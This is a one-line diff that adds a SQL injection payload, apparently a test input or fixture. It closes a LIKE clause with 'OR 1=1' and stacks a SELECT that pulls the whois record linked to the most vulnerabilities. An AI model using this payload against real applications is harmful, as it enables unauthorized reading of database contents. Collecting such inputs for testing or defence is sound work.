@@ -1,0 +1,1 @@
+a%' OR 1=1; SELECT * FROM whois, (SELECT COUNT(vulnerabilities.reference_record_id) AS count, whois.id AS ww FROM whois LEFT JOIN vulnerabilities ON whois.id = vulnerabilities.reference_record_id GROUP BY whois.id ORDER BY count DESC LIMIT 1) ww WHERE ww = whois.id LIMIT 1 --'
